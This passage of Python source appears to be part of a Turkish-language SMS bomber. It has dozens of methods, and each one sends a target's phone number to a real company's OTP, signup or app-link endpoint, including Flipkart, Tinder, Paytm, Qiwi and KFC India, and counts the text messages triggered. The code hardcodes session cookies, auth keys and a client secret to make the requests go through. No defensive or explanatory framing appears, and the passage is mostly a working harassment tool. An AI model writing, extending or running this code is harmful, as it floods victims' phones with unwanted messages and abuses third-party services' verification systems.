            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> Daraz Nepal")

    # Clamphook
    def Clamphook(self):
        try:
            full_number = "90" + self.phone
            url = "https://backend.clamphook.com//auth/register"
            json_data = {
                "mobile": f"90-{full_number}"
            }
            headers = {
                "Host": "backend.clamphook.com",
                "Origin": "https://clamphook.com",
                "Referer": "https://clamphook.com/",
                "Sec-Fetch-Mode": "cors"
            }
            r = requests.post(url, json=json_data, headers=headers, timeout=6)
            if '"success":true' in r.text:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> Clamphook")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> Clamphook")

    # confirmtkt
    def Confirmtkt(self):
        try:
            full_number = "90" + self.phone
            url = "https://securedapi.confirmtkt.com/api/platform/register"
            params = {
                "newOtp": "true",
                "mobileNumber": full_number
            }
            r = requests.get(url, params=params, timeout=6)
            if "false" in r.text:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> confirmtkt")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> confirmtkt")

    # justdial
    def Justdial(self):
        try:
            full_number = "90" + self.phone
            url = "https://t.justdial.com/api/india_api_write/18july2018/sendvcode.php"
            params = {
                "mobile": full_number
            }
            r = requests.get(url, params=params, timeout=6)
            if "sent" in r.text:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> justdial")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> justdial")

    # allensolly
    def Allensolly(self):
        try:
            full_number = "90" + self.phone
            url = "https://www.allensolly.com/capillarylogin/validateMobileOrEMail"
            data = {
                "mobileoremail": full_number,
                "name": "markluther"
            }
            r = requests.post(url, data=data, timeout=6)
            if "true" in r.text:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> allensolly")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> allensolly")

    # frotels
    def Frotels(self):
        try:
            full_number = "90" + self.phone
            url = "https://www.frotels.com/appsendsms.php"
            data = {
                "mobno": full_number
            }
            r = requests.post(url, data=data, timeout=6)
            if "sent" in r.text:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> frotels")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> frotels")

    # gapoon
    def Gapoon(self):
        try:
            full_number = "90" + self.phone
            url = "https://www.gapoon.com/userSignup"
            data = {
                "mobile": full_number,
                "email": "noreply@gmail.com",
                "name": "LexLuthor"
            }
            r = requests.post(url, data=data, timeout=6)
            if "1" in r.text:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> gapoon")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> gapoon")

    # housing
    def Housing(self):
        try:
            full_number = "90" + self.phone
            url = "https://login.housing.com/api/v2/send-otp"
            data = {
                "phone": full_number
            }
            r = requests.post(url, json=data, timeout=6)
            if "Sent" in r.text:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> housing")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> housing")

    # porter
    def Porter(self):
        try:
            full_number = "90" + self.phone
            url = "https://porter.in/restservice/send_app_link_sms"
            data = {
                "phone": full_number,
                "referrer_string": "",
                "brand": "porter"
            }
            r = requests.post(url, data=data, timeout=6)
            if "true" in r.text:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> porter")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> porter")

    # cityflo
    def Cityflo(self):
        try:
            full_number = "90" + self.phone
            url = "https://cityflo.com/website-app-download-link-sms/"
            data = {
                "mobile_number": full_number
            }
            r = requests.post(url, data=data, timeout=6)
            if "sent" in r.text:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> cityflo")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> cityflo")

    # nnnow
    def Nnnow(self):
        try:
            full_number = "90" + self.phone
            url = "https://api.nnnow.com/d/api/appDownloadLink"
            data = {
                "mobileNumber": full_number
            }
            r = requests.post(url, data=data, timeout=6)
            if "true" in r.text:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> nnnow")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> nnnow")

    # ajio
    def Ajio(self):
        try:
            full_number = "90" + self.phone
            url = "https://login.web.ajio.com/api/auth/signupSendOTP"
            data = {
                "firstName": "xxps",
                "login": "wiqpdl223@wqew.com",
                "password": "QASpw@1s",
                "genderType": "Male",
                "mobileNumber": full_number,
                "requestType": "SENDOTP"
            }
            r = requests.post(url, data=data, timeout=6)
            if "1" in r.text:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> ajio")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> ajio")

    # happyeasygo
    def Happyeasygo(self):
        try:
            full_number = "90" + self.phone
            url = "https://www.happyeasygo.com/heg_api/user/sendRegisterOTP.do"
            params = {
                "phone": f"91%20{full_number}"
            }
            r = requests.get(url, params=params, timeout=6)
            if "true" in r.text:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> happyeasygo")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> happyeasygo")

    # unacademy
    def Unacademy(self):
        try:
            full_number = "90" + self.phone
            url = "https://unacademy.com/api/v1/user/get_app_link/"
            data = {
                "phone": full_number
            }
            r = requests.post(url, json=data, timeout=6)
            if "sent" in r.text:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> unacademy")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> unacademy")

    # treebo
    def Treebo(self):
        try:
            full_number = "90" + self.phone
            url = "https://www.treebo.com/api/v2/auth/login/otp/"
            data = {
                "phone_number": full_number
            }
            r = requests.post(url, data=data, timeout=6)
            if "sent" in r.text:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> treebo")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> treebo")

    # airtel
    def Airtel(self):
        try:
            full_number = "90" + self.phone
            url = "https://www.airtel.in/referral-api/core/notify"
            params = {
                "messageId": "map",
                "rtn": full_number
            }
            r = requests.get(url, params=params, timeout=6)
            if "Success" in r.text:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> airtel")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> airtel")

    # pharmeasy
    def Pharmeasy(self):
        try:
            full_number = "90" + self.phone
            url = "https://pharmeasy.in/api/auth/requestOTP"
            data = {
                "contactNumber": full_number
            }
            r = requests.post(url, json=data, timeout=6)
            if "resendSmsCounter" in r.text:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> pharmeasy")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> pharmeasy")

    # mylescars
    def Mylescars(self):
        try:
            full_number = "90" + self.phone
            url = "https://www.mylescars.com/usermanagements/chkContact"
            data = {
                "contactNo": full_number
            }
            r = requests.post(url, data=data, timeout=6)
            if "success@::::" in r.text:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> mylescars")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> mylescars")

    # grofers
    def Grofers(self):
        try:
            full_number = "90" + self.phone
            url = "https://grofers.com/v2/accounts/"
            data = {
                "user_phone": full_number
            }
            headers = {
                "auth_key": "3f0b81a721b2c430b145ecb80cfdf51b170bf96135574e7ab7c577d24c45dbd7"
            }
            r = requests.post(url, data=data, headers=headers, timeout=6)
            if "We have sent" in r.text:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> grofers")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> grofers")

    # dream11
    def Dream11(self):
        try:
            full_number = "90" + self.phone
            url = "https://api.dream11.com/sendsmslink"
            data = {
                "siteId": "1",
                "mobileNum": full_number,
                "appType": "androidfull"
            }
            r = requests.post(url, data=data, timeout=6)
            if "true" in r.text:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> dream11")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> dream11")

    # cashify
    def Cashify(self):
        try:
            full_number = "90" + self.phone
            url = "https://www.cashify.in/api/cu01/v1/app-link"
            params = {
                "mn": full_number
            }
            r = requests.get(url, params=params, timeout=6)
            if "Successfully" in r.text:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> cashify")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> cashify")

    # paytm
    def Paytm(self):
        try:
            full_number = "90" + self.phone
            url = "https://commonfront.paytm.com/v4/api/sendsms"
            data = {
                "phone": full_number,
                "guid": "2952fa812660c58dc160ca6c9894221d"
            }
            r = requests.post(url, json=data, timeout=6)
            if "202" in r.text:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> paytm")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> paytm")

    # kfc-in
    def KfcIn(self):
        try:
            full_number = "90" + self.phone
            url = "https://online.kfc.co.in/OTP/ResendOTPToPhoneForLogin"
            headers = {
                "Referer": "https://online.kfc.co.in/login",
                "__RequestVerificationToken": "-zoQqa7WNa3z-mwOyqWHvcyYkCqYv0h7zqNUAqBivokB75ZiDj-LwQsGk4kB8QextV396CRJxxPAsWXfwYMoPFhMVlQBd1V0ONFeIrpj2C81:ub34fZv2vHPnub-TuF-vkK4rAkfKmIgnZFscecZJ3-kzvRU9CktNjLyLOCFNsixxFGbotqULbV41iHU2K-G0Aoqd4P4MQqIsjJm8tFkZga01"
            }
            data = {
                "AuthorizedFor": "3",
                "phoneNumber": full_number,
                "Resend": "false"
            }
            r = requests.post(url, json=data, headers=headers, timeout=6)
            if "true" in r.text:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> kfc-in")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> kfc-in")

    # indialends
    def Indialends(self):
        try:
            full_number = "90" + self.phone
            url = "https://indialends.com/internal/a/mobile-verification_v2.ashx"
            cookies = {
                "_ga": "GA1.2.1483885314.1559157646",
                "_fbp": "fb.1.1559157647161.1989205138",
                "TiPMix": "91.9909185226964",
                "gcb_t_track": "SEO - Google",
                "gcb_t_keyword": "",
                "gcb_t_l_url": "https://www.google.com/",
                "gcb_utm_medium": "",
                "gcb_utm_campaign": "",
                "ASP.NET_SessionId": "ioqkek5lbgvldlq4i3cmijcs",
                "web_app_landing_utm_source": "",
                "web_app_landing_url": "/personal-loan",
                "webapp_landing_referral_url": "https://www.google.com/",
                "ARRAffinity": "747e0c2664f5cb6179583963d834f4899eee9f6c8dcc773fc05ce45fa06b2417",
                "_gid": "GA1.2.969623705.1560660444",
                "_gat": "1",
                "current_url": "https://indialends.com/personal-loan",
                "cookies_plbt": "0"
            }
            headers = {
                "Referer": "https://indialends.com/personal-loan"
            }
            data = {
                "aeyder03teaeare": "1",
                "ertysvfj74sje": "90",
                "jfsdfu14hkgertd": full_number,
                "lj80gertdfg": "0"
            }
            r = requests.post(url, data=data, headers=headers, cookies=cookies, timeout=6)
            if "1" in r.text:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> indialends")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> indialends")

    # flipkart
    def Flipkart(self):
        try:
            full_number = "90" + self.phone
            url = "https://www.flipkart.com/api/5/user/otp/generate"
            data = {
                "loginId": f"+{full_number}"
            }
            headers = {
                "X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop",
                "Origin": "https://www.flipkart.com",
                "Content-Type": "application/x-www-form-urlencoded"
            }
            r = requests.post(url, data=data, headers=headers, timeout=6)
            if "emailMask" in r.text:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> flipkart")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> flipkart")

    # qlean
    def Qlean(self):
        try:
            full_number = "90" + self.phone
            url = "https://qlean.ru/clients-api/v2/sms_codes/auth/request_code"
            data = {
                "phone": full_number
            }
            r = requests.post(url, data=data, timeout=6)
            if "request_id" in r.text:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> qlean")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> qlean")

    # mailru
    def Mailru(self):
        try:
            full_number = "90" + self.phone
            url = "https://cloud.mail.ru//api/v2/notify/applink"
            data = {
                "phone": f"+{full_number}",
                "api": "2",
                "email": "email",
                "x-email": "x-email"
            }
            r = requests.post(url, data=data, timeout=6)
            if "200" in r.text:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> mail.ru")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> mail.ru")

    # tinder
    def Tinder(self):
        try:
            full_number = "90" + self.phone
            url = "https://api.gotinder.com/v2/auth/sms/send"
            params = {
                "auth_type": "sms",
                "locale": "ru"
            }
            data = {
                "phone_number": full_number
            }
            r = requests.post(url, params=params, data=data, timeout=6)
            if "200" in r.text:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> tinder")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> tinder")

    # youla
    def Youla(self):
        try:
            full_number = "90" + self.phone
            url = "https://youla.ru/web-api/auth/request_code"
            data = {
                "phone": f"+{full_number}"
            }
            r = requests.post(url, json=data, timeout=6)
            if ":6" in r.text:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> youla")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> youla")

    # ivi
    def Ivi(self):
        try:
            full_number = "90" + self.phone
            url = "https://api.ivi.ru/mobileapi/user/register/phone/v6"
            data = {
                "phone": full_number
            }
            r = requests.post(url, data=data, timeout=6)
            if "true" in r.text:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> ivi")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> ivi")

    # delitime
    def Delitime(self):
        try:
            full_number = "90" + self.phone
            url = "https://api.delitime.ru/api/v2/signup"
            data = {
                "SignupForm[username]": full_number,
                "SignupForm[device_type]": "3"
            }
            r = requests.post(url, data=data, timeout=6)
            if "true" in r.text:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> delitime")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> delitime")

    # icq
    def Icq(self):
        try:
            full_number = "90" + self.phone
            url = "https://www.icq.com/smsreg/requestPhoneValidation.php"
            data = {
                "msisdn": full_number,
                "locale": "en",
                "k": "ic1rtwz1s1Hj1O0r",
                "r": "45559"
            }
            r = requests.post(url, data=data, timeout=6)
            if "200" in r.text:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> icq")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> icq")

    # ivitv
    def Ivitv(self):
        try:
            full_number = "90" + self.phone
            url = "https://api.ivi.ru/mobileapi/user/register/phone/v6/"
            data = {
                "phone": full_number,
                "device": "Windows+v.43+Chrome+v.7453451",
                "app_version": "870"
            }
            r = requests.post(url, data=data, timeout=6)
            if "true" in r.text:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> ivitv")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> ivitv")

    # redbus
    def Redbus(self):
        try:
            full_number = "90" + self.phone
            url = "https://m.redbus.in/api/getOtp"
            params = {
                "number": full_number,
                "cc": "90",
                "whatsAppOpted": False
            }
            r = requests.get(url, params=params, timeout=6)
            if "200" in r.text:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> redbus")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> redbus")

    # newtonschools
    def Newtonschools(self):
        try:
            full_number = "90" + self.phone
            url = "https://my.newtonschool.co/api/v1/user/otp/"
            params = {
                "registration": True
            }
            data = {
                "phone": f"+{full_number}"
            }
            r = requests.post(url, params=params, data=data, timeout=6)
            if "S003" in r.text:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> newtonschools")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> newtonschools")

    # qiwi
    def Qiwi(self):
        try:
            full_number = "90" + self.phone
            url = "https://mobile-api.qiwi.com/oauth/authorize"
            data = {
                "response_type": "urn:qiwi:oauth:response-type:confirmation-id",
                "username": full_number,
                "client_id": "android-qw",
                "client_secret": "zAm4FKq9UnSe7id"
            }
            r = requests.post(url, data=data, timeout=6)
            if "confirmation_id" in r.text:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> qiwi")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> qiwi")